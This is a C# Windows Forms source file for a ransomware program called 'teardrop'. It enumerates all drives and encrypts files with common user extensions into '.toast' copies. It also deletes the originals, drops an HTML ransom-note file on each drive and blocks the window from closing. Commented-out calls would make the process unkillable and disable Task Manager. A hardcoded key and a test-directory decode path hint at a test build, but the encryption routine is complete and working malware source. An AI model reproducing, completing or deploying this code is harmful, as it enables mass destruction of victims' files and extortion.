using System.IO;
using System.Security.Cryptography;

namespace teardrop
{
    public partial class FrmMain : Form
    {
        private const string _defaultExtension = ".toast";
        private const string _defaultMessage = "<h1>Title:</h1><p>Message</p>";
        private readonly IProgress<string> _notification;
        private readonly CancellationTokenSource _cancellationTokenSource;
        private readonly CryptoManager _cryptoManager;
        private readonly char[] CHARS = [
            'A','B','C','D','E','F','G','H','I', 'J',
            'K','L','M','N','O','P','Q','R','S', 'T',
            'U','V','W','X','Y','Z','0','1', '2','3',
            '4','5','6','7','8','9','$','%', '#','@',
            '*','&','+','-','[',']','?','/'
        ];
        private readonly string[] ignorePaths =
        [
            "WinSxS", "Windows",  "System32", "Program Files",
            "Program Files (x86)", "System Volume Information"
        ];
        private readonly string[] allowedExtensions =
        [
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav",
            ".pdf", ".raw", ".bat", ".json", ".doc", ".txt",
            ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip",
            ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
            ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln",
            ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
            ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa",
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz",
            ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
            ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb",
            "java", ".cpp", ".cert", ".pem"
        ];
        private readonly int ZERO = 0;

        private enum CypherMode
        {
            Encode,
            Decode
        }

        public FrmMain()
        {
            InitializeComponent();
            string paswordKey = "?J2]]DS$]II+RQ+%*MFC1-7879D@PK3H%L1*URHJEB%R$RC&S-SQF4+?N8/LDM7/";// GetRandomString(64);
            byte[] saltBytes = new byte[32];
            Text = GetRandomString(50);
            txtKey.Text = paswordKey;

            _notification = new Progress<string>(WriteLine);
            RandomNumberGenerator.Create().GetBytes(saltBytes);
            _cancellationTokenSource = new CancellationTokenSource();
            _cryptoManager = new CryptoManager(new CryptoSettings(GetHashBytes(GetKeyBytes(paswordKey)), saltBytes), _cancellationTokenSource.Token);
            //ProcessManager.ProcessUnkillable();
            //MachineManager.DisableTaskManager();
        }
        private static byte[] GetHashBytes(byte[] passwordBytes)
        {
            return SHA256.HashData(passwordBytes);
        }

        private static byte[] GetKeyBytes(string password)
        {
            return System.Text.Encoding.Default.GetBytes(password);
        }

        public string GetRandomString(uint length)
        {
            char[] randomChars = new char[length];

            Random random = new();

            for (int index = ZERO; index < length; index++)
            {
                randomChars[index] = CHARS[random.Next(CHARS.Length)];
            }

            return new string(randomChars);
        }

        public void WriteLine(string text)
        {
            txtBox.Text += $"[{DateTime.Now:yyyyy/MM/dd HH:mm:ss}] {text}{Environment.NewLine}";
        }

        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification)
        {
            try
            {
                if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;
                    
                    DirectoryInfo dirInfo = new(rootPath);

                    foreach (string filePath in Directory.GetFiles(Path.GetFullPath(rootPath)))
                    {
                        if (ignorePaths.Contains(dirInfo.Name)) continue;

                        string extension = Path.GetExtension(filePath);

                        switch (mode)
                        {
                            case CypherMode.Encode:
                                if (!IsValidExtension(extension)) break;

                                newFilePath = FileManager.AddExtension(filePath, _defaultExtension);

                                await _cryptoManager.EncodeFileAsync(filePath, newFilePath);

                                notification.Report($@"Encrypted {filePath}");

                                RemoveFile(filePath);

                                break;

                            case CypherMode.Decode:
                                if (!FileManager.HasExtension(filePath, _defaultExtension)) break;

                                newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);

                                await _cryptoManager.DecodeFileAsync(filePath, newFilePath);

                                notification.Report($"Decrypted {filePath}");

                                RemoveFile(filePath);

                                break;

                            default: throw new NotSupportedException();
                        }

                        foreach (string directory in GetDirectories(rootPath))
                        {
                            await ChangeAllFilesAsync(directory, mode, notification);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                notification.Report(ex.Message);
            }
        }

        private bool IsValidExtension(string extension)
        {
            return allowedExtensions.Contains(extension.ToLower());
        }

        private static IEnumerable<string> GetDirectories(string path)
        {
            return Directory.GetDirectories(path);
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex)
            {
                WriteLine($"Cant delete file {ex.Message}");
            }
        }

        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                await ChangeDriveAsync(drive, mode, notification);
            }
        }

        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification)
        {
            notification.Report($@"Found drive {drive.Name}");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                await ChangeAllFilesAsync(drive.Name, mode, notification);

                FileManager.WriteHtmlFile(drive.Name, _defaultMessage);

            }
            catch (Exception ex)
            {
                notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private async void BtnDecode_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;

            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Decode, _notification);
            //await ManageDrivesAsync(CypherMode.Decode, _notification, _cancellationTokenSource.Token);
        }
    }
}